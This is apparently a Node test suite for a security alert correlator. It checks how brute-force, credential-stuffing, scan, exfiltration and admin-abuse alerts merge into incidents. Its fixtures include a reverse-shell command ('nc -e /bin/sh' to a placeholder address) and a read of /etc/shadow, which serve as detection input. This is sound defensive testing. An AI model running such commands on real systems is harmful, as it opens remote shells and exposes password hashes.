// Run with: npm test. Alerts and events shaped exactly like the backend's (api/app, processor/alerts.py).
import { test } from "node:test";
import assert from "node:assert/strict";
import { Correlator } from "../src/data/backend/correlate.ts";
import type { AlertRow, EnrichedEvent } from "../src/data/backend/types.ts";
import type { Incident } from "../src/data/types.ts";

const T0 = Date.parse("2026-10-06T10:00:00Z");
let n = 0;

function setup() {
  const live = new Map<string, Incident>();
  const removed: string[] = [];
  const expired: string[] = [];
  const c = new Correlator({
    upsert: (i) => live.set(i.id, i),
    remove: (id) => (removed.push(id), live.delete(id)),
    expire: (id) => (expired.push(id), live.delete(id)),
  });
  return { c, live, removed, expired };
}

function event(over: Partial<EnrichedEvent>, at = T0): EnrichedEvent {
  return { event_id: `e${++n}`, event_ts: new Date(at).toISOString(), user: "-", ip: "198.51.100.7", host: "web-01", ...over };
}

function alert(rule: string | null, ev: EnrichedEvent, at = T0, over: Partial<AlertRow> = {}): AlertRow {
  return {
    id: ++n,
    alert_id: `a${n}`,
    rule_id: rule,
    model: null,
    severity: "high",
    event_ids: [ev.event_id],
    status: "open",
    created_ts: new Date(at).toISOString(),
    ...over,
  };
}

/** Feed an event and the alert it raised, the way the live stream does. */
function hit(c: Correlator, rule: string | null, over: Partial<EnrichedEvent>, at = T0, row: Partial<AlertRow> = {}) {
  const ev = event(over, at);
  c.addEvents([ev], at);
  c.addAlert(alert(rule, ev, at, row), at);
  return ev;
}

test("a rule that keeps firing on one address is one incident, not one per alert", () => {
  const { c, live } = setup();
  for (let i = 0; i < 12; i++) {
    hit(c, "brute_force", { event_type: "login", status: "failure", user: "maria.silva" }, T0 + i * 1000);
  }
  assert.equal(live.size, 1);
  const inc = [...live.values()][0];
  assert.equal(inc.attackType, "brute_force");
  assert.equal(inc.signals.length, 1);
  assert.equal(inc.signals[0].ruleId, "BF");
  assert.match(inc.signals[0].sentence, /^12 failed logins for maria\.silva from 198\.51\.100\.7$/);
  assert.equal(inc.severity, 4); // "high" from the backend
  assert.equal(inc.attentionScore, 40); // 20 points, +2 per repeat, capped at double
  assert.deepEqual(inc.fixes, []); // no CRIE: the fallback mitigations show instead
  assert.equal(inc.fallback?.technique, "T1110.001");
});

test("repeats never more than double a rule's points", () => {
  const { c, live } = setup();
  hit(c, "web_scan", { event_type: "http_request", path: "/.env" });
  hit(c, "web_scan", { event_type: "http_request", path: "/.env" }, T0 + 100);
  assert.equal([...live.values()][0].attentionScore, 22);
  for (let i = 0; i < 200; i++) hit(c, "web_scan", { event_type: "http_request", path: "/.env" }, T0 + i * 100);
  assert.equal([...live.values()][0].attentionScore, 40);
});

test("failures across many accounts become one credential stuffing campaign", () => {
  const { c, live, removed } = setup();
  // First address: one account, so it starts as password guessing.
  hit(c, "brute_force", { event_type: "login", status: "failure", user: "a.one", ip: "203.0.113.1", path: "/login" });
  assert.equal([...live.values()][0].attackType, "brute_force");
  // The same address then fails on two more accounts: it is stuffing, and keeps its number.
  hit(c, "brute_force", { event_type: "login", status: "failure", user: "b.two", ip: "203.0.113.1", path: "/login" }, T0 + 1000);
  hit(c, "brute_force", { event_type: "login", status: "failure", user: "c.three", ip: "203.0.113.1", path: "/login" }, T0 + 2000);
  assert.equal(live.size, 1);
  const campaign = [...live.values()][0];
  assert.equal(campaign.id, "0001");
  assert.equal(campaign.attackType, "credential_stuffing");
  // A second address guessing alone joins once it also spreads over accounts.
  hit(c, "brute_force", { event_type: "login", status: "failure", user: "d.four", ip: "203.0.113.2", path: "/login" }, T0 + 3000);
  assert.equal(live.size, 2);
  for (const u of ["e.five", "f.six"]) {
    hit(c, "brute_force", { event_type: "login", status: "failure", user: u, ip: "203.0.113.2", path: "/login" }, T0 + 4000);
  }
  assert.equal(live.size, 1);
  assert.deepEqual(removed, ["0002"]);
  const merged = live.get("0001")!;
  assert.deepEqual(merged.entities.ips.sort(), ["203.0.113.1", "203.0.113.2"]);
  assert.equal(merged.entities.users.length, 6);
  assert.equal(merged.signals[0].sentence, "Failed logins on 6 different accounts from 2 addresses");
});

test("a watch-listed address adds to its open incident and opens none on its own", () => {
  const { c, live } = setup();
  hit(c, "suspicious_ip", { ip: "203.0.113.10" });
  assert.equal(live.size, 0);
  hit(c, "web_scan", { ip: "203.0.113.10", event_type: "http_request", path: "/.git/config" });
  hit(c, "suspicious_ip", { ip: "203.0.113.10" });
  const inc = [...live.values()][0];
  assert.deepEqual(inc.signals.map((s) => s.ruleId), ["SCAN", "IOC"]);
  assert.equal(inc.attentionScore, 35);
});

test("the placeholder scorer is never shown as AI; a real model is", () => {
  const { c, live } = setup();
  hit(c, "data_exfiltration", { user: "admin2", bytes_out: 300_000_000, event_type: "data_transfer" }, T0, { severity: "critical" });
  hit(c, null, { user: "admin2", risk_score: 0.9 }, T0 + 1000, { model: "DummyScorer" });
  let inc = [...live.values()][0];
  assert.equal(inc.detectedBy, "rule");
  hit(c, null, { user: "admin2", risk_score: 0.81 }, T0 + 2000, { model: "atde-xgb-1" });
  inc = [...live.values()][0];
  assert.equal(inc.detectedBy, "both");
  assert.equal(inc.signals[1].ruleId, "ATDE");
  assert.equal(inc.signals[1].sentence, "AI engine (atde-xgb-1): this activity is unusual (score 0.81)");
  assert.equal(inc.severity, 5);
});

test("an alert that arrives before its event waits for it, then goes without", () => {
  const { c, live } = setup();
  const ev = event({ ip: "192.0.2.9", event_type: "http_request", path: "/.env" });
  c.addAlert(alert("web_scan", ev), T0);
  assert.equal(live.size, 0);
  c.addEvents([ev], T0 + 300);
  assert.deepEqual([...live.values()][0].entities.ips, ["192.0.2.9"]);

  const lost = event({ ip: "192.0.2.10" });
  c.addAlert(alert("web_scan", lost), T0);
  c.tick(T0 + 1000);
  assert.equal(live.size, 1);
  c.tick(T0 + 3000);
  assert.equal(live.size, 2);
});

test("the same alert twice counts once (a reconnect replays recent alerts)", () => {
  const { c, live } = setup();
  const ev = event({ event_type: "process_start", user: "admin1", process: "cat /etc/shadow" });
  c.addEvents([ev], T0);
  const row = alert("malicious_process", ev, T0, { severity: "critical" });
  c.addAlert(row, T0);
  c.addAlert(row, T0 + 5000);
  assert.equal([...live.values()][0].signals[0].sentence, "Suspicious command on web-01: cat /etc/shadow");
});

test("an incident expires when its window runs out, and the next alert opens a new one", () => {
  const { c, live, expired } = setup();
  hit(c, "web_scan", { event_type: "http_request", path: "/.env" });
  c.tick(T0 + 14 * 60_000);
  assert.equal(live.size, 1);
  c.tick(T0 + 15 * 60_000); // web scan window: 15 minutes
  assert.deepEqual(expired, ["0001"]);
  hit(c, "web_scan", { event_type: "http_request", path: "/.env" }, T0 + 16 * 60_000);
  assert.deepEqual([...live.keys()], ["0002"]);
});

test("an admin who ran suspicious commands and then moved data out is one incident", () => {
  const { c, live } = setup();
  hit(c, "malicious_process", { user: "admin1", event_type: "process_start", process: "nc -e /bin/sh 10.0.0.1 4444" }, T0, { severity: "critical" });
  hit(c, "data_exfiltration", { user: "admin1", bytes_out: 1_200_000_000, event_type: "data_transfer" }, T0 + 30_000, { severity: "critical" });
  assert.equal(live.size, 1);
  const inc = [...live.values()][0];
  assert.equal(inc.attackType, "admin_abuse");
  assert.equal(inc.signals[1].sentence, "admin1 sent 1.2 GB out in one transfer");
});

test("a failed admin login during a password attack belongs to that attack", () => {
  const { c, live } = setup();
  const login = { event_type: "login", status: "failure", user: "admin1", ip: "203.0.113.50", path: "/admin/login" };
  hit(c, "brute_force", login);
  hit(c, "suspicious_login", login, T0 + 100, { severity: "medium" });
  assert.equal(live.size, 1);
  assert.deepEqual([...live.values()][0].signals.map((s) => s.ruleId), ["BF", "ADM"]);
});
